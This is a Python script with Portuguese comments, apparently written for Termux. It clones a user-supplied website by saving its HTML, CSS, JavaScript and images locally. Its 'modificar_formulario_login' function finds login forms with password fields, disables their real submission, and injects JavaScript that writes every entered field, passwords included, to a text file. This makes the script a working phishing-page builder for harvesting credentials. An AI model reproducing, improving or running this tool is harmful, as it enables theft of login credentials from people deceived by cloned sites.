import requests
from bs4 import BeautifulSoup
import os
from urllib.parse import urljoin

# Função para baixar o HTML, CSS, JavaScript e Imagens
def baixar_html_css_js_imagens(url):
    try:
        # Baixa o conteúdo da página
        response = requests.get(url)
        response.raise_for_status()

        # Extrai o HTML
        html_content = response.text

        # Caminho para salvar os arquivos
        caminho_base = '/data/data/com.termux/files/home/storage/downloads/site_copiado'

        # Cria a pasta se não existir
        if not os.path.exists(caminho_base):
            os.makedirs(caminho_base)

        # Salva o HTML em um arquivo
        with open(f'{caminho_base}/pagina.html', 'w', encoding='utf-8') as file:
            file.write(html_content)

        print("HTML salvo com sucesso.")

        # Analisa o HTML
        soup = BeautifulSoup(html_content, 'html.parser')

        # Baixar CSS
        css_links = soup.find_all('link', rel='stylesheet')
        for i, link in enumerate(css_links):
            css_url = link['href']

            # Resolve URLs relativas
            css_url = urljoin(url, css_url)

            # Baixa o CSS
            css_response = requests.get(css_url)
            css_content = css_response.text

            # Salva o CSS em arquivos
            css_filename = f'{caminho_base}/estilo_{i}.css'
            with open(css_filename, 'w', encoding='utf-8') as css_file:
                css_file.write(css_content)

            print(f"CSS {i+1} salvo com sucesso.")

        # Baixar JavaScript
        js_links = soup.find_all('script', src=True)
        for i, script in enumerate(js_links):
            js_url = script['src']

            # Resolve URLs relativas
            js_url = urljoin(url, js_url)

            # Baixa o JavaScript
            js_response = requests.get(js_url)
            js_content = js_response.text

            # Salva o JavaScript em arquivos
            js_filename = f'{caminho_base}/script_{i}.js'
            with open(js_filename, 'w', encoding='utf-8') as js_file:
                js_file.write(js_content)

            print(f"JavaScript {i+1} salvo com sucesso.")

        # Baixar imagens
        img_tags = soup.find_all('img')
        for i, img in enumerate(img_tags):
            img_url = img['src']

            # Resolve URLs relativas
            img_url = urljoin(url, img_url)

            # Baixa a imagem
            img_response = requests.get(img_url)
            img_data = img_response.content

            # Extrai o nome do arquivo da imagem
            img_filename = os.path.join(caminho_base, f'imagem_{i}.png')

            # Salva a imagem
            with open(img_filename, 'wb') as img_file:
                img_file.write(img_data)

            print(f"Imagem {i+1} salva com sucesso.")

            # Atualiza o caminho da imagem no HTML para o caminho local
            img['src'] = f'imagem_{i}.png'

        # Verificar e modificar formulário de login
        modificar_formulario_login(soup, caminho_base)

        # Após baixar as imagens, salva o HTML atualizado com as referências locais
        with open(f'{caminho_base}/pagina.html', 'w', encoding='utf-8') as file:
            file.write(str(soup))

        print("Referências de imagens no HTML atualizadas e HTML salvo novamente.")

    except Exception as e:
        print(f"Erro ao baixar a página: {e}")

# Função para modificar o formulário de login
def modificar_formulario_login(soup, caminho_base):
    forms = soup.find_all('form')
    
    for form in forms:
        # Verifica se o formulário possui um campo de senha
        if form.find('input', {'type': 'password'}):
            print("Formulário de login identificado!")

            # Modifica o formulário para salvar os dados em um arquivo .txt
            form['action'] = '#'
            form['onsubmit'] = "salvarDados()"

            # Adiciona a função de JavaScript para salvar os dados em um arquivo .txt
            script_js = soup.new_tag('script')
            script_js.string = '''
            function salvarDados() {
                var dados = "";
                var inputs = document.querySelectorAll("input");
                inputs.forEach(function(input) {
                    dados += input.name + ": " + input.value + "\\n";
                });
                var blob = new Blob([dados], { type: "text/plain;charset=utf-8" });
                var link = document.createElement("a");
                link.href = URL.createObjectURL(blob);
                link.download = "dados_formulario.txt";
                link.click();
                return false; // Impede o envio real do formulário
            }
            '''
            # Adiciona o script ao final do corpo (body) do HTML
            soup.body.append(script_js)

            print("Formulário de login modificado para salvar dados em arquivo .txt")

# Solicita a URL do usuário
url = input("Digite a URL do site que você deseja copiar: ")

# Chama a função para baixar o site
baixar_html_css_js_imagens(url)
